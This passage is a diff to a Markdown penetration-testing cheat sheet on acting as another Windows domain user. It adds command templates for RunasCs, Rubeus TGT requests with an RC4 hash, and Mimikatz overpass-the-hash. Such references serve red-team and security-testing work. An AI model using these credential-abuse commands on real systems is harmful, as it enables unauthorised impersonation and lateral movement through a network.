@@ -20,19 +20,27 @@
   * [NTLM Relaying](#NTLM-Relaying)
 
 ## General
-### Run as context of other user
+### Running stuff as context of other user
 #### Runas other user
 ```
 runas /netonly /user:<DOMAIN>\<USER> cmd.exe
 runas /netonly /user:<DOMAIN>\<USER> powershell.exe
 ```
 
-#### Rubeus
+#### Better runas
+- https://github.com/antonioCoco/RunasCs
+```
+.\RunasCs.exe <USER> <PASSWORD> -d <DOMAIN> <COMMAND>
+
+Invoke-RunasCs -Username <USER> -Password <PASSWORD> -Domain <DOMAIN> -Command <COMMAND>
+```
+
+#### Rubeus request tgt
 ```
 .\rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /dc:<DC IP> /rc4:<HASH>
 ```
 
-#### Mimikatz
+#### Mimikatz overpass the hash
 ```
 mimikatz.exe sekurlsa::pth /domain:<DOMAIN> /user:<USER> /rc4:<HASH>
 ```
